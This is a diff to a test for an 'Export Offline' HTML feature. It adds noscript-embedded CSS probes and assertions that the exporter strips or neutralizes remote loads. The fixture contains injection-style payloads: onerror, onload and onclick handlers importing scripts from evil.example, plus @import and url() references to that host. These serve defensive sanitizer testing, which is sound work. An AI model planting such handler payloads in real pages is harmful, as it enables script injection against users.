@@ -425,6 +425,9 @@ test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and 
 <img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
 <svg width="20" height="20" aria-label="foreign handler probe"><rect id="foreignHandlerProbe" width="20" height="20" onload="import('https://evil.example/foreign-handler.js')"/></svg>
 <noscript><button id="noscriptHandlerProbe" onclick="import('https://evil.example/noscript-handler.js')">go</button></noscript>
+<noscript><style id="noscriptStyleProbe">@import "https://evil.example/noscript-imported.css";
+.noscript-bg { background-image: url("//evil.example/noscript-bg.png"); }</style>
+<div id="noscriptInlineStyleProbe" style="background-image:url('//evil.example/noscript-inline.png')">fallback</div></noscript>
 <svg width="20" height="20" aria-label="remote svg refs">
   <image href="https://evil.example/vector.png" width="20" height="20"></image>
   <use href="https://evil.example/sprite.svg#icon"></use>
@@ -480,6 +483,20 @@ test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and 
     const noscriptHandlerTag = exportedHtml.match(/<button\b[^>]*id="noscriptHandlerProbe"[^>]*>/i);
     expect(noscriptHandlerTag && noscriptHandlerTag[0]).toBeTruthy();
     expect(noscriptHandlerTag[0]).not.toMatch(/\sonclick\s*=/i);
+    // The CSS inside that same fallback body: a `<style>` block and a `style=` attribute a
+    // scripting-disabled reader really does fetch. The strict validator reads both off the
+    // fallback view, so the export has to scrub them for the gate and the exporter to agree
+    // (CMH-OFFLINE-05); asserting it here is what keeps the gate from rejecting a file the
+    // export just produced.
+    expect(exportedHtml).not.toMatch(/noscript-imported\.css|noscript-bg\.png|noscript-inline\.png/i);
+    const noscriptStyleTag = exportedHtml.match(/<style\b[^>]*id="noscriptStyleProbe"[^>]*>/i);
+    expect(noscriptStyleTag && noscriptStyleTag[0]).toBeTruthy();
+    const noscriptInlineStyleTag =
+      exportedHtml.match(/<div\b[^>]*id="noscriptInlineStyleProbe"[^>]*>/i);
+    expect(noscriptInlineStyleTag && noscriptInlineStyleTag[0]).toBeTruthy();
+    // The strip NEUTRALIZES a network `url(...)` to `url("data:,")` rather than deleting the
+    // declaration, so assert no NETWORK url remains - not that no `url(` does.
+    expect(noscriptInlineStyleTag[0]).not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:)?\/\//i);
     expect(exportedHtml).not.toContain("evil.example");
     expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
     expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
